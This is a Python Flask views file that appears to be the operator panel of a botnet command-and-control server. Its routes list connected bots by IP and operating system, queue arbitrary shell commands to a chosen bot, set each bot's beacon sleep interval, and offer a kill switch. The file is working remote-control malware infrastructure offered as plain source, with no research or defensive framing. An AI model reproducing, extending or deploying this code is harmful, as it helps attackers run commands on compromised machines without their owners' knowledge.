from app import app, master, db
from flask import render_template, g, abort, request
from flask.ext.security import current_user, login_required
from app.forms import RunCommand, SetSleepInterval
from threading import Thread
from app.models import Bot
import json

@app.before_first_request
def before_first():
    master_t = Thread(target=master.main)
    master_t.start()

@app.before_request
def before_request():
    if app.killswitch:
        abort(500)
    g.queue = master.queue
    g.user = current_user

@app.route('/')
@app.route('/home')
@app.route('/index')
def index():
    return render_template("index.html", title="Home")

@app.route('/kill')
@login_required
def kill():
    app.killswitch = 1
    abort(500)

@app.route('/testcmd')
@login_required
def testcmd():
    g.queue['127.0.0.1'].append("run:okay dad")
    b = Bot.query.filter_by(ip="127.0.0.1").one()
    return str(b.last_seen)

@app.route("/api/clients/list", methods=["GET"])
@login_required
def api_clients_list():
    bots = [ Bot.query.filter_by(ip=c).one() for c in g.queue.keys() ]
    data = {}
    for bot in bots:
        data[bot.id] = dict()
        data[bot.id]["IP"] = bot.ip
        data[bot.id]["OS"] = bot.os
        data[bot.id]["last_seen"] = bot.last_seen
        data[bot.id]["last_response"] = bot.last_response
        data[bot.id]["set_interval"] = bot.sleep_interval
    return json.dumps(data)

@app.route("/api/clients/cmd", methods=["POST"])
@login_required
def api_clients_cmd():
    data = json.loads(request.get_data())
    g.queue[data['IP']].append("run:"+data['cmd'])
    return "", 200

@app.route("/api/clients/sleep", methods=["POST"])
@login_required
def api_clients_sleep():
    data = json.loads(request.get_data())
    try: int(data['interval'])
    except: return "", 500
    g.queue[data['IP']].append("set sleep:"+data['interval'])
    bot = Bot.query.filter_by(ip=data['IP']).one()
    bot.sleep_interval = data['interval']
    db.session.add(bot)
    db.session.commit()
    return "", 200

@app.route("/bots")
@login_required
def bots():
    cmd_form = RunCommand()
    int_form = SetSleepInterval()
    return render_template("bots.html", title="Bots", cmd_form=cmd_form, int_form=int_form)
